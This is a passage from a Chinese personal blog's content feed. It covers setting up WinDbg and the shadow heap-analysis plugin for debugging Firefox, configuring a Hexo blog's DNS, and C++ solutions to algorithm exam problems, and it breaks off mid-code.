      <content type="html"><![CDATA[<h2 id="firefox调试环境搭建"><a href="#firefox调试环境搭建" class="headerlink" title="firefox调试环境搭建"></a>firefox调试环境搭建</h2><h3 id="关闭firefox多进程"><a href="#关闭firefox多进程" class="headerlink" title="关闭firefox多进程"></a>关闭firefox多进程</h3><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133104.jpg" alt=""><br>打开firefox，访问aboutt:config，如图设置为false。</p><h3 id="windbg配置"><a href="#windbg配置" class="headerlink" title="windbg配置"></a>windbg配置</h3><p>我是从windows store下载的windbg preview<br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133125.jpg" alt=""><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133137.jpg" alt=""><br>界面好看<br>然后配置一下符号服务器：<code>SRV*c:\mysymbol*http://symbols.mozilla.org</code><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133149.jpg" alt=""></p><h3 id="shadow配置"><a href="#shadow配置" class="headerlink" title="shadow配置"></a>shadow配置</h3><p><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a></p><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133157.jpg" alt=""><br>然后下载<a href="https://githomelab.ru/pykd" target="_blank" rel="noopener">pykd</a>，其实就是一个dll<br>配置好python环境，下载<a href="https://www.python.org/ftp/python/2.7.11/python-2.7.11.amd64.msi" target="_blank" rel="noopener">python2.7.11</a>，用高版本会出bug。<br>然后<code>pip install pykd</code><br>注意pip需要配置一下终端代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:1080</span><br><span class="line">set https_proxy=https://127.0.0.1:1080</span><br></pre></td></tr></table></figure></p><p>然后测试使用</p><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><h4 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h4><p> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133207.jpg" alt=""></p><h4 id="载入pykd-dll，从而可以在windbg执行py"><a href="#载入pykd-dll，从而可以在windbg执行py" class="headerlink" title="载入pykd.dll，从而可以在windbg执行py"></a>载入pykd.dll，从而可以在windbg执行py</h4><p><code>!load 路径\pykd.dll</code><br> <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133213.jpg" alt=""></p><h4 id="启动shadow"><a href="#启动shadow" class="headerlink" title="启动shadow"></a>启动shadow</h4><p><code>!py d:\useful\shadow\pykd_driver.py</code></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-03-133220.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> edge </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo blog搭建及域名解析</title>
      <link href="/2018/06/30/blog_build/"/>
      <url>/2018/06/30/blog_build/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有个小傻子弄不好域名解析。。我写一下吧。</p><h2 id="blog搭建"><a href="#blog搭建" class="headerlink" title="blog搭建"></a>blog搭建</h2><p>参考我学弟写的就可以，很详细<br><a href="https://kabeor.cn/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="noopener">https://kabeor.cn/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</a></p><h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>我域名在主机壳买的，安利一下<br><a href="https://www.zhujike.com/" target="_blank" rel="noopener">https://www.zhujike.com/</a><br>买了之后可以在域名列表里看到<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015647.png" alt=""><br>然后可以在域名解析里添加域名解析<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015720.png" alt=""><br>具体的</p><ul><li>@<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015731.png" alt=""></li><li>www<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015747.png" alt=""><h2 id="hexo-CNAME"><a href="#hexo-CNAME" class="headerlink" title="hexo CNAME"></a>hexo CNAME</h2>然后在如图路径下建立一个CNAME文件<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-015835.png" alt=""><br>内容就是你的域名了。<br>然后同步一下，等一会就解析好了。<h2 id="关于博客管理"><a href="#关于博客管理" class="headerlink" title="关于博客管理"></a>关于博客管理</h2>建议写好分类和标签<br>能用tag来分的小类不要用categories来分<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-30-020002.png" alt=""><br>其他的多读wiki，等我哪天博客重建了再写。</li></ul>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog搭建 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>algorithm期末考试</title>
      <link href="/2018/06/29/algorithm/"/>
      <url>/2018/06/29/algorithm/</url>
      <content type="html"><![CDATA[<h2 id="简单背包问题"><a href="#简单背包问题" class="headerlink" title="简单背包问题"></a>简单背包问题</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171258.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> data[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">weight</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> n)</span><span class="comment">//w是重量，n是剩下的件数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (w == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (w!=<span class="number">0</span>&amp;&amp;n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (weight(w - data[n], n - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> weight(w, n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> w, n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;w&gt;&gt;n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (weight(w, n)) &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"YES"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"NO"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Buyer"><a href="#Buyer" class="headerlink" title="Buyer"></a>Buyer</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171631.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输入1：可以支配的钱和可以选择的物品种类数</span></span><br><span class="line"><span class="comment">输入2：N行，每行为每种物品的价钱和受欢迎程度</span></span><br><span class="line"><span class="comment">输出1：可能达到的最大的受欢迎程度</span></span><br><span class="line"><span class="comment">输出2：购买的物品的编号（物品不重复购买）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Food</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> m_money;</span><br><span class="line">    <span class="keyword">int</span> m_value;</span><br><span class="line">&#125; Food;</span><br><span class="line">Food food[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> F[<span class="number">1000</span>][<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxlove</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= money; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((j - food[i].m_money) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                F[i][j] = max(F[i - <span class="number">1</span>][j], F[i - <span class="number">1</span>][j - food[i].m_money] + food[i].m_value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                F[i][j] = F[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> F[n][money];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> money, n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; money &gt;&gt; n) &#123;</span><br><span class="line">        food[<span class="number">0</span>].m_money = <span class="number">0</span>;</span><br><span class="line">        food[<span class="number">0</span>].m_value = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; food[i].m_money &gt;&gt; food[i].m_value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> result=maxlove(n,money);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//n是种类总数,money是钱</span></span><br><span class="line">        <span class="keyword">if</span>(result==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> remain = money;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (remain &gt;= food[i].m_money) &#123;</span><br><span class="line">                <span class="keyword">if</span> (F[i][remain] - F[i - <span class="number">1</span>][remain - food[i].m_money] == food[i].m_value) &#123;</span><br><span class="line">                    remain = remain - food[i].m_money;</span><br><span class="line">                    <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; n - i + <span class="number">1</span>;</span><br><span class="line">                        flag=<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt;<span class="string">" "</span>&lt;&lt; n - i + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Renting-Boats"><a href="#Renting-Boats" class="headerlink" title="Renting Boats"></a>Renting Boats</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-171804.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 假设输入数据为：</span></span><br><span class="line"><span class="comment">                  4</span></span><br><span class="line"><span class="comment">            5 14 23</span></span><br><span class="line"><span class="comment">               5 12</span></span><br><span class="line"><span class="comment">                  8</span></span><br><span class="line"><span class="comment">以下为输入的数据分布（即m[i][j]）</span></span><br><span class="line"><span class="comment">    租船点\还船点</span></span><br><span class="line"><span class="comment">                0   1   2   3</span></span><br><span class="line"><span class="comment">            0   0   5   14  23</span></span><br><span class="line"><span class="comment">            1   0   0   5   12</span></span><br><span class="line"><span class="comment">            2   0   0   0   8</span></span><br><span class="line"><span class="comment">            3   0   0   0   0</span></span><br><span class="line"><span class="comment">p[i][j]：</span></span><br><span class="line"><span class="comment">    租船点\还船点</span></span><br><span class="line"><span class="comment">                0   1   2   3</span></span><br><span class="line"><span class="comment">            0   0   5   10  17</span></span><br><span class="line"><span class="comment">            1   0   0   5   12</span></span><br><span class="line"><span class="comment">            2   0   0   0   8</span></span><br><span class="line"><span class="comment">            3   0   0   0   0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> m[<span class="number">200</span>][<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">200</span>][<span class="number">200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; m[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> minNum = m[<span class="number">0</span>][i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            minNum = min(minNum, p[<span class="number">0</span>][j] + m[j][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        p[<span class="number">0</span>][i] = minNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; p[<span class="number">0</span>][n - <span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Shortest-path-counting"><a href="#Shortest-path-counting" class="headerlink" title="Shortest path counting"></a>Shortest path counting</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-172016.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> P[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        P[<span class="number">0</span>][i]=<span class="number">1</span>;</span><br><span class="line">        P[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            P[i][j]=P[i<span class="number">-1</span>][j]+P[i][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;P[n<span class="number">-1</span>][n<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Coin-collecting-by-robot"><a href="#Coin-collecting-by-robot" class="headerlink" title="Coin-collecting by robot"></a>Coin-collecting by robot</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-172107.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">1000</span>][<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;<span class="built_in">map</span>[i][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">0</span>][i]=<span class="built_in">map</span>[<span class="number">0</span>][i<span class="number">-1</span>]+<span class="built_in">map</span>[<span class="number">0</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">0</span>]=<span class="built_in">map</span>[i<span class="number">-1</span>][<span class="number">0</span>]+<span class="built_in">map</span>[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;m;j++)</span><br><span class="line">            <span class="built_in">map</span>[i][j]=max(<span class="built_in">map</span>[i<span class="number">-1</span>][j],<span class="built_in">map</span>[i][j<span class="number">-1</span>])+<span class="built_in">map</span>[i][j];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">map</span>[n<span class="number">-1</span>][m<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Soldiers"><a href="#Soldiers" class="headerlink" title="Soldiers"></a>Soldiers</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-170631.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x[<span class="number">10001</span>],y[<span class="number">10001</span>];</span><br><span class="line">    <span class="keyword">int</span> xs,ys;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;x[i]&gt;&gt;y[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+n);</span><br><span class="line">        sort(y,y+n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            x[i]-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+n);</span><br><span class="line">        xs=ys=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            xs+=<span class="built_in">abs</span>(x[i]-x[n/<span class="number">2</span>]);</span><br><span class="line">            ys+=<span class="built_in">abs</span>(y[i]-y[n/<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;xs+ys&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Independent-Task-Scheduling"><a href="#Independent-Task-Scheduling" class="headerlink" title="Independent Task Scheduling"></a>Independent Task Scheduling</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-28-170826.png" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">202</span>][<span class="number">10000</span>];<span class="comment">//dp[i][j] 表示前i个作业中A机器花j分钟的时候 B机器所花时间</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">200</span>], b[<span class="number">200</span>];</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        sum += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = 